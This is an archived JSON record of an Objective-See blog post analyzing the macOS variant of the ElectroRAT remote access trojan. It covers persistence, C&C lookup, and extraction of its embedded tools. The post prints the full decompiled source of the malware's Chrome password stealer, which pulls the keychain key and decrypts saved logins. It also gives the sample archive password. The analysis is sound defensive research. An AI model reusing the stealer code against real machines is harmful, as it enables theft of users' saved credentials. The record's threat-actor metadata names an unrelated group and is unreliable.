{
    "id": "9cda8818-3a2d-4dec-9640-bb759497da7f",
    "created_at": "2023-01-12T15:10:10.610719Z",
    "updated_at": "2025-03-27T02:16:26.279167Z",
    "deleted_at": null,
    "sha1_hash": "5a5917e13e48f57fd989570667ccf4c055517728",
    "title": "2021-01-05 - Discharging ElectroRAT",
    "authors": "",
    "file_creation_date": "2022-05-29T01:23:51Z",
    "file_modification_date": "2022-05-29T01:23:51Z",
    "file_size": 4832638,
    "plain_text": "# Objective-See's Blog\n\n**objective-see.com/blog/blog_0x61.html**\n\n### Discharging ElectroRAT\n\n Analyzing the first (macOS) malware of 2021.\n\n by: Patrick Wardle / January 5, 2021\n\n Our research, tools, and writing, are supported by the \"Friends of Objective-See\" such as:\n\n Become a Friend! üìù üëæ Want to play along? I‚Äôve added the samples (ElectroRAT) to our malware collection (password: infect3d)\n\n ‚Ä¶please don‚Äôt infect yourself!\n\n## Background\n\n### Not one week into 2021, and we‚Äôve got the first new malware affecting macOS:\n```\nElectroRat !\n\n#### ElectroRAT is a cross-platform RAT, uncovered by Intezer:\n\n### \"\n\n we discovered a wide-ranging operation targeting cryptocurrency users, estimated to have initiated in January 2020. This extensive operation is composed of a full-fledged marketing campaign, custom cryptocurrency-related applications and a new Remote Access Tool (RAT) written from scratch.\"\n\n [its main goal appears to] ...steal personal information from cryptocurrency users\" - Intezer\n\n```\n\n-----\n\n### In terms of it s infection vector, Intezer noted:\n\n \"These [malicous] applications were promoted in cryptocurrency and blockchain- related forums such as bitcointalk and SteemCoinPan. The promotional posts, published by fake users, tempted readers to browse the applications‚Äô web pages, where they could download the application without knowing they were actually installing malware.\" -Intezer\n\n As the Intezer report predominantly focused on the Windows variant of the malware, let‚Äôs build upon their researcher, diving deeper into the macOS variant ( OSX.ElectroRAT ).\n\n## Triage\n\n### The Intezer shared an the hash of a disk image (.dmg) containing the macOS variant of\n```\nElectoRAT .\n\n With a SHA-1 of 2795ca35847cecb543f713b773d87c089a6a38ba, we can grab this from VirusTotal ‚Ä¶noting its name ( eTrader-0.1.0_mchos.dmg ) and the fact that detections aren‚Äôt that good (yet):\n\n eTrader-0.1.0_mchos.dmg Once we download the disk image ( eTrader-0.1.0_mchos.dmg ), we can mount it via the\nhdiutil command:\n% hdiutil attach ElectroRat/eTrader-0.1.0_mchos.dmg \nexpected  CRC32 $6C68ADDC\n/dev/disk2      GUID_partition_scheme      \n/dev/disk2s1     Apple_HFS            /Volumes/eTrader 0.1.0\n\n It mounts to /Volumes/eTrader 0.1.0, and contains a single application, eTrader.app :\n\n```\n\n-----\n\n### eTrader-0.1.0_mchos.dmg ...mounted Via WhatsYourSign, we can see this application is not notarized nor signed ‚Ä¶meaning it won‚Äôt (easily) run on recent versions of macOS:\n\n eTrader app unsigned\n\n\n-----\n\n### Often triaging an application, I manually poke around via the terminal. However, a new (free!) app named Apparency (from the developers of Suspicious Package), offers a way to statically explore applications via the UI:\n\n eTrader.app, in Apparency On the right-hand side of the Apparency window, we see various information about the application, such as the identifier (app.com.trader ) and a (fake) copyright notice ( (c)\n```\n2020 John Doe ).\n\n Let‚Äôs take a peak at the applications Info.plist :\n\n```\n\n-----\n\n```\n$ defaults read /Volumes/eTrader\\ 0.1.0/eTrader.app/Contents/Info.plist \n{\n  AsarIntegrity = \"{\\\\\"checksums\\\\\":\n{\\\\\"app.asar\\\\\":\\\\\"kpsG1Z5PL...6vpzzhTLQ==\\\\\"}}\";\n  BuildMachineOSBuild = 17D102;\n  CFBundleDisplayName = eTrader;\n  CFBundleExecutable = eTrader;\n  CFBundleIdentifier = \"app.com.trader\";\n  ...\n  DTSDKBuild = \"10.13\";\n  DTSDKName = \"macosx10.13\";\n  DTXcode = 0941;\n  DTXcodeBuild = 9F2000;\n  ...\n  NSCameraUsageDescription = \"This app needs access to the camera\";\n  NSHighResolutionCapable = 1;\n  NSHumanReadableCopyright = \"Copyright \\\\U00a9 2020 John Doe\";\n  NSMainNibFile = MainMenu;\n  NSMicrophoneUsageDescription = \"This app needs access to the microphone\";\n  NSPrincipalClass = AtomApplication;\n  ...\n}\n\n### The presence of the AsarIntegrity key/value pair indicate its built via Electron.\n\n Electon is, ‚Äúa framework for creating native applications with web technologies like JavaScript, HTML, and CSS.‚Äù\n\n To learn more about Electon, head over to:\n\n ElectronJS.org. Other key/value pairs of interest include NSCameraUsageDescription and\nNSMicrophoneUsageDescription which indicate the application may request permission\n\n to access camera and microphone.\n\n If we examine the application bundle in Finder, we notice a non-standard folder,\nContents/Utils which contains a single file: mdworker :\n\n```\n\n-----\n\n### Contents/Utils Via the file command, we can ascertain that mdworker a standard 64-bit Mach-O executable:\n```\n$ file /Volumes/eTrader\\ 0.1.0/eTrader.app/Contents/Utils/mdworker\n/Volumes/eTrader 0.1.0/eTrader.app/Contents/Utils/mdworker: Mach-O 64-bit executable\nx86_64\n\n ‚Ä¶as we‚Äôll see, this appears to be core (malicious) component of OSX.ElectroRAT\n\n## Analysis\n\n### Let‚Äôs pop into a virtual machine and run the malware ( eTrader.app ). But first, let‚Äôs install some free, open-source dynamic analysis tools, including:\n   ProcessMonitor\n\n Our user-mode (open-source) utility that monitors process creations and terminations, providing detailed information about such events.\n   FileMonitor\n\n Our user-mode (open-source) utility monitors file events (such as creation, modifications, and deletions) providing detailed information about such events.\n   Netiquette\n\n Our (open-source) network monitor.\n\n```\n\n-----\n\n### When launched (in a VM), eTrader.app shows an innocuous looking sign-in window:\n\n eTrader.app UI ‚Ä¶but in the background, our passive dynamic analysis tools readily detect malicious behavior.\n\n First off (via the ProcessMonitor), we see that the application (who‚Äôs pid is 1350 ) executes the Utils/mdworker binary (via bash ):\n\n\n-----\n\n```\n# ProcessMonitor.app/Contents/MacOS/ProcessMonitor pretty\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  ...\n  \"uid\" : 501,\n  \"arguments\" : [\n   \"/bin/sh\",\n   \"-c\",\n   \"/Users/user/Desktop/eTrader.app/Contents/Utils/mdworker\"\n  ],\n  \"ppid\" : 1350,\n  \"architecture\" : \"Intel\",\n  \"path\" : \"/bin/sh\",\n  \"name\" : \"sh\",\n  \"pid\" : 1355\n }\n}\n\n### Once off and running, our FileMonitor captures the Utils/mdworker copying itself to\n~/.mdworker :\n# FileMonitor.app/Contents/MacOS/FileMonitor -pretty\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_CREATE\",\n \"file\" : {\n  \"destination\" : \"/Users/user/.mdworker\",\n  \"process\" : {\n   \"uid\" : 501,\n   \"arguments\" : [\n    \"/bin/sh\",\n    \"-c\",\n    \"/Users/user/Desktop/eTrader.app/Contents/Utils/mdworker\"\n   ],\n   \"ppid\" : 1350,\n   \"architecture\" : \"Intel\",\n   \"path\" : \"/Users/user/Desktop/eTrader.app/Contents/Utils/mdworker\",\n   \"name\" : \"mdworker\",\n   \"pid\" : 1351\n  }\n }\n}\n\n The mdworker binary then creates a launch agent plist,\n~/Library/LaunchAgents/mdworker.plist :\n\n```\n\n-----\n\n```\n# FileMonitor.app/Contents/MacOS/FileMonitor pretty\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_CREATE\",\n \"file\" : {\n  \"destination\" : \"/Users/user/Library/LaunchAgents/mdworker.plist\",\n  \"process\" : {\n   \"uid\" : 501,\n   \"arguments\" : [\n    \"/bin/sh\",\n    \"-c\",\n    \"/Users/user/Desktop/eTrader.app/Contents/Utils/mdworker\"\n   ],\n   \"ppid\" : 1350,\n   \"architecture\" : \"Intel\",\n   \"path\" : \"/Users/user/Desktop/eTrader.app/Contents/Utils/mdworker\",\n   \"name\" : \"mdworker\",\n   \"pid\" : 1351\n  }\n }\n}\n\n### As expected, the launch agent plist ( mdworker.plist ) references the .mdworker binary:\n% cat ~/Library/LaunchAgents/mdworker.plist\n  Label\n  mdworker\n  ProgramArguments\n    /Users/user/.mdworker\n  RunAtLoad\n\n Also, worth noting, as the RunAtLoad is set to true the OS will automatically (re)launch the malware each time the user (re)logs in.\n\n Now that OSX.ElectroRAT has persisted, what does it do? In a Twitter thread, Avigayil (the security researcher at Intezer) notes that the malware, ‚Äúqueries a raw pastebin page to retrieve the C&C IP address‚Äù:\n\n```\n\n-----\n\n### [2/7] Upon execution, ElectroRAT queries a raw pastebin page to retrieve the C&C IP address. The malware then calls the registerUser function, which creates and sends a user registration Post request to the C&C. pic.twitter.com/r98bbVThs3\n\n ‚Äî Avigayil Mechtinger (@AbbyMCH) January 5, 2021\n\n Via Wireshark, we can confirm the macOS variant of ElectroRAT performs these same actions. First querying pastebin:\n\n ‚Ä¶and then once the address of the command and control server ( 213.226.100.140 ) is retrieved, connects out (with some basic information about infected machine):\n\n Once the malware has checked in with the command and control server, it acts upon any (remote) tasking:\n\n\n-----\n\n### [5/7] Commands received from the C&C are parsed by the RAT using corresponding functions before sending a message back with the response. The commands are sent as a json structure with the following keys: type, uid and data for additional parameters needed for the command. pic.twitter.com/7Y2A70Ha9g\n\n ‚Äî Avigayil Mechtinger (@AbbyMCH) January 5, 2021\n\n Avigayil also notes that:\n\n \"The attacker uses go-bindata to embed additional binaries within the malware\"\n\n In a disassembler, we can search for strings ( _main.static_darwin* ) to uncover what may be (statically) embedded binaries, specific to the macOS (darwin) variant:\n\n Statically embedded binaries(?) ‚Ä¶so, how to extract these embedded binaries? Well thanks to Avigayil, we know they are embedded via go-bindata. This in an open-source project (on Github), that:\n\n \"\n\n converts any file into manageable Go source code.\n\n ...useful for embedding binary data into a Go program. The file data is optionally gzip compressed\" -go-bindata\n\n So, we know the binaries are embedded and (likely) gzip compressed.\n\n Hopping back to the disassembler, let‚Äôs first find the embedded (gzipped) binary data(s) (‚Ä¶ we‚Äôll use the embedded webcam capture binary, as an example).\n\n As noted, the malware contains various functions named main.static_darwin*, that seem relevant to the embedded binary data. Looking at the\n```\nmain.static_darwinCam_macos function (at 0x0000000004395bf0 ) we find a cross\n```\n\n-----\n\n### reference to a variable named _main._static_darwinCam_maco (note the _ in the\n```\n_static ) that‚Äôs passed as an argument to a function named main.bindataRead :\n1_main.static_darwinCam_macos:\n2 ...\n3 ; argument #3 for method _main.bindataRead\n4 0x0000000004395c2d  mov  rdx, qword [_main._static_darwinCam_macos] \n5 ...\n6 0x0000000004395c57  call main.bindataRead \n\n The main._static_darwinCam_macos variable is located at 0x0000000004d3f190 ‚Ä¶and contains a pointer 0x0000000004800760 0x0000000004d3f190 dq 0x0000000004800760\n\n Heading over to 0x0000000004800760 (offset 0x800760 in the file) we find gzip‚Äôd data:\n\n Embedded gzipped data gzip‚Äôd data begins with a two byte signature: 0x1F 0x8B. Following is a another byte, indicating the compression method. The most common value for this 3rd byte is 0x08 (DEFLATE).\n\n Hooray, we‚Äôve found the embedded compressed binary data for the (web)camera binary.\n\n```\n\n-----\n\n### To extract out the embedded bytes, I put together a super simple python script that simply open the malware‚Äôs binary, goes to the offset of the embedded data, and writes it said out to disk. As the /usr/bin/gzip utility (that we‚Äôll use to decompress the extracted data), ignores extra/trailer bytes, we don‚Äôt have to care about getting the length of the compressed data write. As such, we take the lazy approach and just write out all the embedded data from the (start) offset in the malicious binary, to the end.\n```\n 1import sys\n 2import gzip\n 3\n 4f = open(sys.argv[1], 'rb')\n 5f.seek(int(sys.argv[2], 16), 0)\n 6\n 7o = open(\"extractedData.gz\", 'wb')\n 8o.write(f.read())\n 9\n10o.close()\n11f.close()\n\n Executing the above script with the path to the malware ( mdworker ) and the offset (of the embedded cam binary data, 0x800760 ) will extract and write out the compressed bytes to\nextractedData.gz . This file can then be decompressed with the gzip utility:\n% python extract.py mdworker 800760\n% gzip -d extracted.gz \ngzip: extracted.gz: trailing garbage ignored\n% file extracted\nextracted: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit\nexecutable x86_64] [i386:Mach-O executable i386]\n\n Woohoo, we‚Äôve now got a Mach-O binary!\n\n We repeat the process for each of the main.static_darwin* symbols. Which gets us several other Mach-O binaries ‚Ä¶and a ‚ÄúApple Desktop Services Store‚Äù (DS_Store) file:\n% file *\ndarwinCam:     Mach-O universal binary with 2 architectures: \n          [x86_64:Mach-O executable x86_64] [i386:Mach-O executable i386]\ndarwinChrome:   Mach-O 64-bit executable x86_64\ndarwinDs_store:  Apple Desktop Services Store\ndarwinKeylogger:  Mach-O 64-bit executable x86_64\ndarwinVnc:     Mach-O 64-bit executable x86_64\n\n```\n\n-----\n\n### You can find these extract files in the OSX.ElectroRAT sample I ve uploaded to Objective- See's macOS malware collection. Let‚Äôs briefly triage these (now extracted) binaries\n```\n   darwinCam ( SHA1: 7e0a289572c2b3ef5482dded6019f51f35f85456 ):\n\n Appears to be a ImageSnap ‚Ä¶a well-known (open-source) commandline utility for capturing images via the infected device‚Äôs camera:\n   ./darwinCam -h\n   USAGE: ./darwinCam [options] [filename]\n   Version: 0.2.5\n   Captures an image from a video device and saves it in a file.\n   If no device is specified, the system default will be used.\n   If no filename is specfied, snapshot.jpg will be used.\n   Supported image types: JPEG, TIFF, PNG, GIF, BMP\n    -h     This help message\n    -v     Verbose mode\n    -l     List available video devices\n    -t x.xx   Take a picture every x.xx seconds\n    -q     Quiet mode. Do not output any text\n    -w x.xx   Warmup. Delay snapshot x.xx seconds after turning on camera\n    -d device  Use named video device\n\n```\n\n-----\n\n```\ndarwinChrome ( SHA1: 4bb418ba9833cd416fd02990b8c8fd4fa8c11c0c ):\n\n### Via embedded strings, we can determine that the darwinChrome was packaged up with PyInstaller . As such can use the pyinstxtractor utility, to extract (unpackage) its contents:\n$ python pyinstxtractor.py darwinChrome\n[+] Processing darwinChrome\n[+] Pyinstaller version: 2.1+\n[+] Python version: 27\n[+] Length of package: 5155779 bytes\n[+] Found 109 files in CArchive\n[+] Beginning extraction...please standby\n[+] Possible entry point: pyiboot01_bootstrap.pyc\n[+] Possible entry point: Apple.pyc\n[+] Found 335 files in PYZ archive\n[+] Successfully extracted pyinstaller archive: darwinChrome\n\n This produces several files including a compiled Python file, Apple.pyc . Via an online decompiler we can then recover Apple.pyc ‚Äôs Python source code:\n\n```\n\n-----\n\n```\n 1# uncompyle6 version 3.5.0\n 2# Python bytecode 2.7 (62211)\n 3# Decompiled from: Python 2.7.5 (default, Aug 7 2019, 00:51:29) \n 4# [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]\n 5# Embedded file name: Apple.py\n 6\"\"\"\n 7Get unencrypted 'Saved Password' from Google Chrome\n 8\n 9Example:\n10  >>> import ChromePasswd\n11  >>> chrome_pwd = ChromePasswd()\n12  >>> print chrome_pwd.get_login_db\n13  /Users/x899/Library/Application Support/Google/Chrome/Default/\n14  \n15  >>> chrome_pwd.get_pass(prettyprint=True)\n16    {\n17        \"data\": [\n18            {\n19                \"url\": \"https://x899.com/\",\n20                \"username\": \"admin\",\n21                \"password\": \"secretP@$$w0rD\"\n22            },\n23            {\n24                \"url\": \"https://accounts.google.com/\",\n25                \"username\": \"x899@gmail.com\",\n26                \"password\": \"@n04h3RP@$$m0rC1\"\n27            }\n28        ]\n29    }\n30\n31TO DO:\n32  * Cookie support\n33  * Update database Password directly\n34\n35\"\"\"\n36import platform\n37from getpass import getuser\n38from shutil import copy\n39import sqlite3\n40from os import unlink\n41import json\n42from importlib import import_module\n43import string, sys, subprocess, glob, os\n44\n45class ChromePasswd(object):\n46  \"\"\" Main ChromePasswd Class \"\"\"\n47\n48  def __init__(self):\n49    \"\"\" Constructor: determine target platform \"\"\"\n50    self.target_os = platform.system()\n51    if self.target_os == 'Darwin':\n52      self.mac_init()\n53    elif self.target_os == 'Windows':\n54      self.win_init()\n55    elif self.target_os == 'Linux':\n\n```\n\n-----\n\n```\n 56      self.linux_init()\n 57\n 58  def import_libraries(self):\n 59    \"\"\" import libraries based on underlying platform \"\"\"\n 60    try:\n 61      if self.target_os == 'Darwin':\n 62        globals()['AES'] = import_module('Crypto.Cipher.AES')\n 63        globals()['KDF'] = import_module('Crypto.Protocol.KDF')\n 64        globals()['subprocess'] = import_module('subprocess')\n 65      elif self.target_os == 'Windows':\n 66        globals()['win32crypt'] = import_module('win32crypt')\n 67      elif self.target_os == 'Linux':\n 68        globals()['AES'] = import_module('Crypto.Cipher.AES')\n 69        globals()['KDF'] = import_module('Crypto.Protocol.KDF')\n 70    except ImportError as err:\n 71      print ('[-] Error: {}').format(str(err))\n 72      sys.exit()\n 73\n 74  def linux_init(self):\n 75    \"\"\" Linux Initialization Function \"\"\"\n 76    self.import_libraries()\n 77    my_pass = ('peanuts').encode('utf8')\n 78    iterations = 1\n 79    salt = 'saltysalt'\n 80    length = 16\n 81    self.key = KDF.PBKDF2(my_pass, salt, length, iterations)\n 82    self.dbpath = ('/home/{}/.config/googlechrome/Default/').format(getuser())\n 83    self.decrypt_func = self.nix_decrypt\n 84\n 85  def mac_init(self):\n 86    \"\"\" Mac Initialization Function \"\"\"\n 87    self.import_libraries()\n 88    my_pass = subprocess.Popen(\"security find-generic-password -wa\n'Chrome'\", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n 89    stdout, _ = my_pass.communicate()\n 90    my_pass = stdout.replace('\\n', '')\n 91    iterations = 1003\n 92    salt = 'saltysalt'\n 93    length = 16\n 94    self.key = KDF.PBKDF2(my_pass, salt, length, iterations)\n 95    loginData = glob.glob('%s/Library/Application\nSupport/Google/Chrome/Profile*/' % os.path.expanduser('~'))\n 96    if len(loginData) == 0:\n 97      loginData = glob.glob('%s/Library/Application\nSupport/Google/Chrome/Default/' % os.path.expanduser('~'))\n 98    self.dbpath = loginData[0]\n 99    self.decrypt_func = self.nix_decrypt\n100\n101  def nix_decrypt(self, enc_passwd):\n102    \"\"\"\n103    Linux and Mac's decryption function\n104\n105    :paran enc_passwd: encrypted password\n106    :return: decrypted password\n\n```\n\n-----\n\n```\n107    \n108    initialization_vector = '        '\n109    enc_passwd = enc_passwd[3:]\n110    cipher = AES.new(self.key, AES.MODE_CBC, IV=initialization_vector)\n111    decrypted = cipher.decrypt(enc_passwd)\n112    return decrypted.strip().decode('utf8')\n113\n114  def win_init(self):\n115    \"\"\" Windows Initialization Function \"\"\"\n116    self.import_libraries()\n117    self.dbpath = ('C:\\\\Users\\\\{}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User\nData\\\\Default\\\\').format(getuser())\n118    self.decrypt_func = self.win_decrypt\n119\n120  def win_decrypt(self, enc_passwd):\n121    \"\"\"\n122    Window's decryption function\n123\n124    :paran enc_passwd: encrypted password\n125    :return: decrypted password\n126    \"\"\"\n127    data = win32crypt.CryptUnprotectData(enc_passwd, None, None, None, 0)\n128    return data[1]\n129\n130  @property\n131  def get_login_db(self):\n132    \"\"\" getting \"Login Data\" sqlite database path \"\"\"\n133    return self.dbpath\n134\n135  def get_pass(self, prettyprint=False):\n136    \"\"\"\n137    Getting URL, username and password in clear text\n138\n139    :param prettyprint: if it is True, output dictionary will be\n140              printed on the screen\n141    :return: clear text data in dictionary format\n142    \"\"\"\n143    copy(self.dbpath + 'Login Data', 'Login Data.db')\n144    conn = sqlite3.connect('Login Data.db')\n145    cursor = conn.cursor()\n146    cursor.execute('SELECT action_url, username_value, password_value\\n \nFROM logins')\n147    data = {'data': []}\n148    for result in cursor.fetchall():\n149      _passwd = self.decrypt_func(result[2])\n150      passwd = ('').join(i for i in _passwd if i in string.printable)\n151      if result[1] or passwd:\n152        _data = {}\n153        _data['url'] = result[0]\n154        _data['username'] = result[1]\n155        _data['password'] = passwd\n156        data['data'].append(_data)\n157\n158    conn.close()\n159    unlink('Login Data.db')\n\n```\n\n-----\n\n```\n160    if prettyprint:\n161      print json.dumps(data, indent=4)\n162    return data\n163\n164\n165def main():\n166  \"\"\" Operational Script \"\"\"\n167  chrome_pwd = ChromePasswd()\n168  chrome_pwd.get_pass(prettyprint=True)\n169\n170\n171if __name__ == '__main__':\n172  main()\n\n### ‚Ä¶looks like a Chrome password stealer!\ndarwinKeylogger ( SHA1: 3bcbfc40371c8d96f94b5a5d7c83264d22b0f57b ):\n\n This binary appears to be a basic macOS keylogger based on the open-source Swift- Keylogger project (that (ab)uses IOHIDManagerCreate /\nIOHIDManagerRegisterInputValueCallback ).\n\n Note that on recent versions of macOS, this requires explicit user approval:\n\n built-in capabilities\n\n```\n\n-----\n\n```\n   darwinVnc ( SHA1: 872da05c137e69617e16992146ebc08da3a9f58f ):\n\n### This binary appears to the well known OSXvnc, a ‚Äúrobust, full-featured VNC server for MacOS X‚Äù:\n   ./darwinVnc -h\n   Available options:\n   -rfbport port     TCP port for RFB protocol (0=autodetect first open port\n   5900-5909)\n   -rfbwait time     Maximum time in ms to wait for RFB client\n   -rfbnoauth       Run the server without password protection\n   -rfbauth passwordFile Use this password file for VNC authentication\n               (use 'storepasswd' to create a password file)\n   -rfbpass        Supply a password directly to the server\n   ...\n\n The malware also supports a variety of built-in standard backdoor capabilities ...such command execution, file upload/download and more\n\n```\n\n-----\n\n### built-in capabilities Avigayil sums this up well:\n\n \"\n\n ElectroRAT is extremely intrusive.\n\n ...it has various capabilities such as keylogging, downloading files and executing commands on the victim's console.\"\n\n## Detection(s)\n\n### Good news, though this malware is brand new, several of our free (open-source) macOS security tools readily can detect and alert on it‚Äôs malicious behaviors.\n\n For example, when OSX.ElectroRAT persists, BlockBlock can alert you of this fact:\n\n\n-----\n\n### BlockBlock: unauthorized persistence ‚Ä¶while our firewall, LuLu will block and alert on the malware‚Äôs unauthorized network connections:\n\n LuLu: unauthorized network connection In terms of static IOCs, the presences of the following files may indicated an\n```\nOSX.ElectroRAT infection:\n   ~/.mdworker\n   ~/Library/LaunchAgents/mdworker.plist\n\n## Conclusions\n\n### Looks like 2021 will be another year filled with Mac malware!\n\n In this blog post, we analyzed the new;y discovered ElectroRAT . Focusing on the macOS version, we detailed its:\n\n```\n\n-----\n\n### Launch agent persistence Extracted and triaged its embedded binaries ‚Ä¶ and discussed its built-in capabilities.\n\n## üìö The Art of Mac Malware\n\n### If this blog posts pique your interest, definitely check out my new book on the topic of Mac Malware Analysis: ‚ÄúThe Art Of Mac Malware: Analysis‚Äù. It‚Äôs free online, and new content is regularly added!\n\n## üíï Support Us:\n\n### Love these blog posts? You can support them via my Patreon page!\n\n This website uses cookies to improve your experience.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-05 - Discharging ElectroRAT.pdf"
    ],
    "report_names": [
        "2021-01-05 - Discharging ElectroRAT.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536210,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653787431,
    "ts_modification_date": 1653787431,
    "files": {
        "pdf": "https://archive.orkl.eu/5a5917e13e48f57fd989570667ccf4c055517728.pdf",
        "text": "https://archive.orkl.eu/5a5917e13e48f57fd989570667ccf4c055517728.txt",
        "img": "https://archive.orkl.eu/5a5917e13e48f57fd989570667ccf4c055517728.jpg"
    }
}